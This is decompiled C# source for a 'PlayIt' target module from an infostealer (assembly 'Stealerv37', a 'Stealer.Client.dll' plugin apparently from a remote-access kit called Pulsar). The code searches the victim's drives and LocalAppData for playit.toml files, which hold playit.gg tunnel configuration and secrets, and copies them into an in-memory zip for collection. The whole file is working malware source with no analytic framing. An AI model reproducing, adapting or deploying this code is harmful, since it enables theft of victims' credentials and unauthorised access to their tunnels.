// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.PlayIt
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Applications;

public class PlayIt : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (PlayIt);
    Parallel.ForEach<string>((IEnumerable<string>) ProcessWindows.FindFile("playit.toml"), (Action<string>) (toml =>
    {
      string entryPath = $"PlayIt\\playit{RandomStrings.GenerateHashTag()}.toml";
      zip.AddFile(entryPath, File.ReadAllBytes(toml));
      counterApplications.Files.Add($"{toml} => {entryPath}");
    }));
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "playit_gg", "playit.toml");
    if (File.Exists(path))
    {
      string entryPath = "PlayIt\\playit.toml";
      zip.AddFile(entryPath, File.ReadAllBytes(path));
      counterApplications.Files.Add($"{path} => {entryPath}");
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counter.Applications.Add(counterApplications);
  }
}
